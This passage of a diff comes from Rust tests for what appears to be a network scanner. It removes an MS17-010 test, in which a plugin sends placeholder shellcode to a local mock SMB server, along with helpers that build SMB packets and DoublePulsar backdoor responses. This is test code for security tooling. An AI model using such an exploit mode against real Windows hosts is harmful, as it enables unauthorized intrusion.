-                    captured.extend_from_slice(&second);
-                    *capture.lock().expect("capture should lock") = captured;
-                }
-            }
-        });
-
-        set_ms17010_runtime_options(Ms17010RuntimeOptions {
-            shellcode: Some("41414141414141414141".to_string()),
-        });
-        let findings = scan_services(
-            &[OpenService {
-                host: "127.0.0.1".to_string(),
-                port,
-            }],
-            "ms17010",
-            &PluginContext {
-                usernames: Vec::new(),
-                passwords: Vec::new(),
-                timeout_secs: 2,
-                ssh_key_path: None,
-            },
-        )
-        .expect("scan should succeed");
-        set_ms17010_runtime_options(Ms17010RuntimeOptions::default());
-
-        server.join().expect("server should finish");
-
-        assert_eq!(findings.len(), 1);
-        assert_eq!(findings[0].details["exploit"], json!("payload-sent"));
-        let captured = payload_capture.lock().expect("capture should lock").clone();
-        assert!(!captured.is_empty());
-        assert!(captured.windows(10).any(|window| window == b"AAAAAAAAAA"));
-    }
-
-    #[test]
     fn detects_findnet_identification() {
         let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
         let port = listener.local_addr().expect("local addr").port();
@@ -8424,7 +7392,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
             },
             AuthRuntimeOptions::default(),
             RedisRuntimeOptions::default(),
-            Ms17010RuntimeOptions::default(),
             ConnectionRuntimeOptions::default(),
             {
                 let inflight = Arc::clone(&inflight);
@@ -8473,7 +7440,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
             },
             AuthRuntimeOptions::default(),
             RedisRuntimeOptions::default(),
-            Ms17010RuntimeOptions::default(),
             ConnectionRuntimeOptions::default(),
             {
                 let executed = Arc::clone(&executed);
@@ -8523,7 +7489,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
             },
             AuthRuntimeOptions::default(),
             RedisRuntimeOptions::default(),
-            Ms17010RuntimeOptions::default(),
             ConnectionRuntimeOptions::default(),
             |task| {
                 if task.plugin_key == "ssh" {
@@ -8780,97 +7745,6 @@ zSzfRta6NR6ILTdj7W2rfKU=\n\
         response[items_start..items_start + items.len()].copy_from_slice(&items);
         response.extend_from_slice(&utf16le_bytes("Windows Server 2022|"));
         response
-    }
-
-    fn ms17010_negotiate_response() -> Vec<u8> {
-        let mut response = vec![0u8; 36];
-        response[4..8].copy_from_slice(b"SMB\x72");
-        response
-    }
-
-    fn ms17010_session_response(user_id: [u8; 2], os: &str) -> Vec<u8> {
-        let byte_count = os.len() + 2;
-        let mut response = vec![0u8; 45 + byte_count];
-        response[4..8].copy_from_slice(b"SMB\x73");
-        response[32..34].copy_from_slice(&user_id);
-        response[36] = 1;
-        response[43..45].copy_from_slice(&(byte_count as u16).to_le_bytes());
-        response[46..46 + os.len()].copy_from_slice(os.as_bytes());
-        response
-    }
-
-    fn ms17010_tree_response(tree_id: [u8; 2]) -> Vec<u8> {
-        let mut response = vec![0u8; 36];
-        response[4..8].copy_from_slice(b"SMB\x75");
-        response[28..30].copy_from_slice(&tree_id);
-        response
-    }
-
-    fn ms17010_named_pipe_response(vulnerable: bool) -> Vec<u8> {
-        let mut response = vec![0u8; 36];
-        response[4..8].copy_from_slice(b"SMB\x25");
-        if vulnerable {
-            response[9..13].copy_from_slice(&[0x05, 0x02, 0x00, 0xC0]);
-        }
-        response
-    }
-
-    fn ms17010_backdoor_response(backdoor: bool) -> Vec<u8> {
-        let mut response = vec![0u8; 36];
-        response[4..8].copy_from_slice(b"SMB\x32");
-        if backdoor {
-            response[34] = 0x51;
-        }
-        response
-    }
-
-    fn ms17010_tree_connect_request_for(host: &str, user_id: [u8; 2]) -> Vec<u8> {
-        ms17010_tree_connect_request(host, user_id)
-    }
-
-    fn ms17010_trans_named_pipe_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
-        let mut request = ms17010_trans_named_pipe_request();
-        request[28..30].copy_from_slice(&tree_id);
-        request[32..34].copy_from_slice(&user_id);
-        request
-    }
-
-    fn ms17010_trans2_session_setup_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
-        let mut request = ms17010_trans2_session_setup_request();
-        request[28..30].copy_from_slice(&tree_id);
-        request[32..34].copy_from_slice(&user_id);
-        request
-    }
-
-    fn read_netbios_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
-        let mut header = [0u8; 4];
-        stream.read_exact(&mut header)?;
-        let length =
-            ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | header[3] as usize;
-        let mut body = vec![0u8; length];
-        stream.read_exact(&mut body)?;
-        let mut message = header.to_vec();
-        message.extend_from_slice(&body);
-        Ok(message)
-    }
-
-    fn ms17010_framed_response(
-        command: u8,
-        tree_id: [u8; 2],
-        user_id: [u8; 2],
-        extra: &[u8],
-    ) -> Vec<u8> {
-        let mut body = vec![0u8; 32];
-        body[0..4].copy_from_slice(b"\xFFSMB");
-        body[4] = command;
-        body[24..26].copy_from_slice(&tree_id);
-        body[28..30].copy_from_slice(&user_id);
-        body.extend_from_slice(extra);
-        let length = body.len() as u32;
-        let mut packet = vec![0x00, 0x00, 0x00, 0x00];
-        packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
-        packet.extend_from_slice(&body);
-        packet
     }
 
     fn mssql_login_ack_payload() -> Vec<u8> {
